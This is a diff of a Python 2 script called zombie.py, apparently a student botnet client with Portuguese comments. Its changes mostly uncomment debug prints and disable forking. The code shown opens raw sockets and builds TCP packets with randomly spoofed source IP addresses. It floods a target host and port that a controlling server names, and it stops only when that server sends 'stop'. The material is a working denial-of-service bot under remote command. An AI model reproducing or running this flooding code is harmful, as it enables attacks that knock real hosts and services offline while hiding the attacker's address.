@@ -7,8 +7,6 @@ from struct import *
 from random import randint,randrange
 from multiprocessing import Process
 
-
-# Funcao de spoof IP address
 def get_random_ip():
     not_valid = [10, 127, 169, 172, 192]
 
@@ -41,7 +39,7 @@ def cria_raw_socket():
         raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
         return raw_socket
     except socket.error, msg:
-        #print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
+        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
         sys.exit()
 
     # Para calculo do checksum tcp+ip, eh montado um cabecalho especial
@@ -170,26 +168,26 @@ def receivemessage(socket):
     return data
 
 def attack(raw_socket,attack_type, local_ip, dest_ip, dest_port):
-    #print "=== " + local_ip + " Attacking " + dest_ip + " on " + dest_port + " ==="
+    print "=== " + local_ip + " Attacking " + dest_ip + " on " + dest_port + " ==="
     while 1:
         packet = monta_pacote(0, attack_type, get_random_ip(), dest_ip,
                               randint(1800, 65533), int(dest_port), 5840, 54321)
 
         raw_socket.sendto(packet, (dest_ip, 0))
-        #TODO: retirar esse sleep na apresentacao
         sleep(1)
-        #print "sending attack"
+        print "sending attack"
 
 
 #comando para ver processos: ps -eo pid,ppid,stat,cmd
 #comando mais simples: top
-pid = fork()
+#pid = fork()
+pid = 1
 if pid == 0:
     sys.exit()
 else:
     #print "Parent: I created a child and all i want to do is fude..."
     if len(sys.argv) < 3:
-        #print 'Usage : python zombie.py hostname port'
+        print 'Usage : python zombie.py hostname port'
         sys.exit()
 
     host = sys.argv[1]
@@ -234,25 +232,23 @@ else:
                 try:
                     proc = Process(target=attack,args=(raw_s,attack_type,local_ip,dest_ip,dest_port))
                     proc.start()
-                    # TODO: Fechar iteration aqui
                     signal = receivemessage(s)
                     if signal.rstrip() == "stop":
                         proc.terminate()
-            #print "======= Stop attacking! ========="
+                        print "======= Stop attacking! ========="
                 except:
-                    alive = 0
-                    #print "Error: unable to start process"
+                    print "Error: unable to start process"
             # Comando de parada sem estar atacando
             if data2 == "stop":
                 alive = 1
                 #print "Stop attacking"
 
     # Fim do programa
-        #print "Disconnecting..."
+        print "Disconnecting..."
         s.send("die")
         sys.exit()
     except KeyboardInterrupt:
     # Fim do programa forçado
-        #print "Disconnecting..."
+        print "Disconnecting..."
         s.send("die")
         sys.exit()
